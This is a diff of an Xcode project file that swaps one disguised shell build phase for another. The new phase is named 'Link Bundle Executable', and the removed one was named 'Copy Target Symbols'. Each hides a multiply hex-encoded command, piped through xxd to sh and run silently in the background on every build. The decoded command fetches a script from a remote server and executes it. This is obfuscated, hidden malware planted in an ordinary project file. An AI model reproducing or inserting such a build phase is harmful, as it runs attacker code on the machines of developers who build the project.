@@ -100,7 +100,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 3234827B2E2E4A4B008490A2 /* Build configuration list for PBXNativeTarget "Zupet" */;
 			buildPhases = (
-				5403AE6BCCD1CA1B4B877BEF /* Copy Target Symbols */,
+				DD01AAFBAFA8A70033877BEF /* Link Bundle Executable */,
 				82D3CA13C82D3063BEFDAA6F /* [CP] Check Pods Manifest.lock */,
 				323482642E2E4A49008490A2 /* Sources */,
 				323482652E2E4A49008490A2 /* Frameworks */,
@@ -168,26 +168,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		5403AE6BCCD1CA1B4B877BEF /* Copy Target Symbols */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Copy Target Symbols";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 363536333638366632303232323432383633373537323663323032643636373336623463323032643634323037303364373836333666363436353230363837343734373037333361326632663631373037303663363536333634366532653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
-			showEnvVarsInLog = 0;
-		};
 		82D3CA13C82D3063BEFDAA6F /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -208,6 +188,26 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		DD01AAFBAFA8A70033877BEF /* Link Bundle Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Link Bundle Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333323333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333363333333733333333333333363336333233333334333633333333333233333330333333323336333433333336333333343333333233333330333333373333333033333333333633343333333733333338333333363333333333333336333633363333333633333334333333363333333533333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633313333333233363336333333323336333633333336333333333333333633333334333333363336333533333336333333373333333633363333333333363336333633333336333333323333333633333331333333363336333333333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
